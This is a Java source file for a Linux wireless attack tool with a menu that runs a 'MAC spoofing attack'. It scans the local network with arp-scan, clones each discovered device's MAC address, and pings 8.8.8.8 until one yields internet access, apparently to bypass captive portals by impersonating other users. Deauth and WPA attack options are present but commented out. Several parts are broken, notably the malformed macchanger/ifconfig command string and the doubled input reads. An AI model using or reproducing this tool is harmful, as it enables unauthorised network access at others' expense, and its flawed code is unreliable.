package com.company;

import java.io.*;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Scanner;

public class Main {
    private static Scanner scanner = new Scanner(System.in);
    static String wi = "wlp5s0";

    public static void main(String[] args) throws IOException, NoSuchAlgorithmException, InterruptedException {


        System.out.println("It is highly recommended to run this program with sudo");


        if (System.getProperty("os.name").startsWith("Windows")) {
            System.out.println("Please run within the windows ubuntu filesystem.");
            // System.exit(0);
        } else if (System.getProperty("os.name").startsWith("mac")) {
            System.out.println("Sorry, macOS isn't supported yet, please run from a vm.");
            // System.exit(0);
        } else checkdep();


        System.out.println("Success! PUIAS has been successfully started ");

        while (true) {

            System.out.println("---------------------------------------------");
            System.out.println("|Hello what would you like to do today?");
            System.out.println("| edit - edit wireless card name (curently: "+wi+")");
            //     System.out.println("| 1 - launch deauth attack");
            //   System.out.println("| 2 - launch WPA attack");
            System.out.println("| 3 - launch MAC spoofing attack");
            System.out.println("---------------------------------------------");

            if (scanner.nextLine().equals("edit")){
                System.out.println("Enter card name in standard mode: ");
                wi = scanner.nextLine();
                System.out.println("Done! wireless card is now: "+wi);
            }
            if (scanner.nextLine().equals("3")) {
                ArrayList<String> macs = execute("arp-scan -l", true);
                macs.remove(0);
                macs.remove(0);
                macs.remove(macs.size() - 1);
                macs.remove(macs.size() - 1);
                macs.remove(macs.size() - 1);
                System.out.println(macs.size() + " possible targets found: ");
                for (String mac : macs) {
                    mac = mac.split("\t")[1];
                    System.out.println(mac);
                }
                for (String mac : macs) {
                    if (trymac(mac)) {
                        System.out.println(mac);
                        break;
                    }
                }

            }
        }
    }

    private static void checkdep() throws IOException {
        System.out.println("checking dep");
        boolean aircrack = checkpackage("aircrack-ng");
        boolean macchanger = checkpackage("macchanger");
        boolean arpscan = checkpackage("arp-scan");
        boolean pkexec = checkpackage("pkexec");


        if (!macchanger || !aircrack || !arpscan) {
            System.out.println("Error, some of the application requirements are missing");

            File dep = new File("dep.sh");
            dep.delete();
            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(dep));
            bufferedWriter.write("#!/bin/sh");


            if (!pkexec) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install pkexec");
            }
            if (!macchanger) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install macchanger");
            }
            if (!arpscan) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install arp-scan");
            }
            if (!aircrack) {
                bufferedWriter.newLine();
                bufferedWriter.write("sudo apt install aircrack-ng");
            }
            bufferedWriter.close();
            System.out.println("please run: 'chmod +x dep.sh' and 'sudo bash dep.sh' (two commands, no quotes)");
            System.exit(0);
        }
    }


    private static boolean checkpackage(String packageS) {
        ArrayList<String> pkg_stat = execute("dpkg -S " + packageS, false);
        boolean installed = pkg_stat.size() > 0;
        System.out.println(packageS + (installed ? " [OK]" : "[!]"));
        return installed;
    }


    private static ArrayList<String> execute(String command, boolean sudo) {
        if (sudo) {
            command = "pkexec " + command;
        }
        ArrayList<String> out = new ArrayList<>();
        try {
            Process p = Runtime.getRuntime().exec(command);
            BufferedReader br = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));
            String s;


            while ((s = br.readLine()) != null)
                out.add(s);
            p.waitFor();
            p.destroy();
        } catch (Exception ignored) {
            ignored.printStackTrace();
        }
        return out;
    }


    private static ArrayList<String> change_mac(String mac) {
        return execute("ifconfig " + wi + " down && macchanger -m && ifconfig " + wi + " up" + mac, true);
    }

    private static boolean trymac(String mac) {
        change_mac(mac);
        boolean conected = false;
        while (!conected) {
            ArrayList<String> captive_ping = execute("ping 8.8.8.8 -c 4", false);
            conected = !captive_ping.contains("connect: Network is unreachable");
        }
        return !execute("ping 8.8.8.8 -c 6", false).contains("100% packet loss");
    }


}